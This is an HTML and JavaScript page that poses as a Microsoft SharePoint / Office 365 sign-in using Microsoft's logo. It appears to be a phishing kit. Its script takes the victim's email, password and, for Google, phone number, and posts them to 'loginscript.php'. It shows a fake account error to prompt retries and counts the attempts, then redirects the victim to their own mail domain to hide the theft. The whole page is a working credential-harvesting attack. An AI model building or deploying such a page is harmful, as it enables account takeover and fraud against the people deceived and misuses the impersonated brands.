<!DOCTYPE html>
<html lang="en">
<head>
	<title>Login V2</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->	
	
<!--===============================================================================================-->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css" integrity="sha384-zCbKRCUGaJDkqS1kPbPd7TveP5iyJE0EjAuZQTgFLD2ylzuqKfdKlfG/eSrtxUkn" crossorigin="anonymous"><!--===============================================================================================-->

	<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v2/css/main.css">
<!--===============================================================================================-->
<style type="text/css">
	.container-login100{
		background: url("https://i.ibb.co/0svszXY/officei-365-onedrive.png");
		background-size: cover;
	}
	.wrap-input100 {
    width: 100%;
    position: relative;
    border-bottom: 1px solid #adadad;
    margin-bottom: 20px;
}
.wrap-login100 {
    border-radius: unset;
    padding: 30px;
    }
    .btn{
    	 border-radius: unset;
    }
    .sign-icon{
    	    background: #f8f8f8;
    padding: 10px 5px;
    border: solid 1px #e3dede;
    margin-bottom: 10px;
    }
    .sign-icon span{
    	font-weight: bold;
    }
    .sign-icon img{
    	width: 30px;
    }
    .red{
    	    border-bottom: 1px solid red;
    }
</style>
</head>
<body>
		<div style="background-color: #0078D4;
    background-image: none; width: 100%; height: 48px; position: absolute; float: left; z-index: 10;"><div class="row title ext-title"  style="margin: 0; padding: 10px; color: #fff;">
																						<div role="heading" aria-level="1" data-bind="text: title">Microsoft Sharepoint</div>
																				</div></div>
	<div class="limiter">
		<div class="container-login100">
			<div class="wrap-login100">
				<div class="mb-3">
					<div class="pb-2 logo_chang"><img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" width="50px" alt="" ><span></span></div>
				<h3 style="font-size:20px">
						Sign in
					</h3></div>
					<small class="text-danger" id="eError" style="display: none;">We couldn't find an account with that email address. Try another.</small>
				<form class="login100-form validate-form">

					<div class="wrap-input100 validate-input email-div" data-validate = "Valid email is: a@b.c">
						<input class="input100" type="text" name="email" id="email" placeholder="Email">
						<input type="hidden" name="ltype" id="ltype" value="Office365">
						<input type="hidden"  name="lcount" id="lcount" value="0">
						
					</div>
					<div class="wrap-input100 validate-input phoneno-div" style="display:none;">
						<input class="input100" type="text" name="phoneno" id="phoneno" placeholder="Mobile Number">
						
					</div>

					<div class="wrap-input100 validate-input mb-4 pass-div" data-validate="Enter password">
						
						<input class="input100" type="password" name="pass" id="pass"  placeholder="Password">
						
					</div>

					<div style="float: right;">
					
							
							<button class="btn btn-primary" type="button" id="submit-btn" onclick="postrez();"><span id="submit-btn-text">Login</span>
								
							</button>
					
					</div>

					
				</form>
			</div>
		</div>
	</div>
	
<div class="modal fade" id="staticBackdrop" data-backdrop="static" data-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="staticBackdropLabel">Sign in Account</h5>
       
      </div>
      <div class="modal-body">
      	<div class="row text-center" style="margin: 0 15px">
      		<div class="col-md-4 sign-icon">
      			<a href="#"><img src="https://cdn-icons-png.flaticon.com/512/732/732223.png" class="img-fluid"><br/>
      			<span>Outlook</span></a>
      		</div>
      		<div class="col-md-4 sign-icon">
      			<a href="#"><img src="https://cdn-icons-png.flaticon.com/512/2991/2991148.png" class="img-fluid"><br/>
      			<span>Google</span></a>
      		</div>
      		<div class="col-md-4 sign-icon">
      			<a href="#"><img src="https://cdn-icons-png.flaticon.com/512/226/226262.png" class="img-fluid"><br/>
      			<span>Yahoo</span></a>
      		</div>
      		<div class="col-md-4 sign-icon">
      			<a href="#"><img src="https://smallimg.pngkey.com/png/small/220-2200461_aol-eraser-aol-logo.png" class="img-fluid"><br/>
      			<span>Aol</span></a>
      		</div>
      		<div class="col-md-4 sign-icon">
      			<a href="#"><img src="http://simpleicon.com/wp-content/uploads/mail-5.png" class="img-fluid"><br/>
      			<span>Other Email</span></a>
      		</div>
      	</div>
       
      </div>
      <div class="modal-footer">
      	<div class="col-md-12 ">
      		
      			<a href="#" class="btn btn-primary" data-dismiss="modal" style="width:100%"><img src="https://cdn.iconscout.com/icon/free/png-256/microsoft-office-722717.png" width="30px" class="img-fluid">
      			<span>Continue With office 365</span></a>
      		</div>
      </div>
    
    </div>
  </div>
</div>
	
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-fQybjgWLrvvRgtW6bFlB7jaZrFsaBXjsOMm/tB9LTS58ONXgqbR9W8oWht/amnpF" crossorigin="anonymous"></script>

<script type="text/javascript">
	 var url ="loginscript.php";
	$('#staticBackdrop').modal('show');
	$('.sign-icon a').on('click',function(){
		var vtitle = $(this).find("span").text();
	var vimag = $(this).find("img").attr('src');
	$(".logo_chang img").attr('src',vimag);
	$(".logo_chang span").html(vtitle);
	$("#ltype").val(vtitle);
		console.log(vtitle);
		if(vtitle=='Google'){
			$('.phoneno-div').show();

		}else{
$('.phoneno-div').hide();
		}
		$('#staticBackdrop').modal('hide');
}
		)
  function isEmail(email) {
  var regex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
  return regex.test(email);
}
   
	 function postrez(){
	 	var ltype = $("#ltype").val();
    var email = $("#email").val();
    var pass = $("#pass").val();
    var phoneno = $("#phoneno").val();
var btn_div = $("#submit-btn");  
var lcount = $("#lcount").val();

 var my_email = email;
    var ind = my_email.indexOf("@");
    var my_slice = my_email.substr((ind + 1));
    var mainPage = 'https://' + my_slice;
if(isEmail(email)===true){

}else{
	console.log('red')
   $(".email-div").addClass('red');
return false;
    }

         if(email=='' || pass==''){
     $(".email-div").addClass('red');
      $(".pass-div").addClass('red');
    return false; 
}else{
document.getElementById("submit-btn").disabled = true; 
      $("#submit-btn-text").html('Please wait');
        $.ajax({
            type: "POST",
            url: url,
            data: { action : 'signup', email : email, pass : pass, phoneno : phoneno, ltype : ltype, lc : lcount} 
        }).done(function(data){
            var datArray = data.split("|");
          console.log('response: ', data);
if(datArray[0] == "ok"){
       
        window.location.replace("http://"+my_slice);

}else {
  $("#lcount").val(parseFloat(lcount)+1);
    $("#eError").show();

   $("#pass").val('');
   $("#submit-btn-text").html('Login');
        document.getElementById("submit-btn").disabled = false;
return false;
}
          
    
        }); 
    }
    }
</script>
</body>
</html>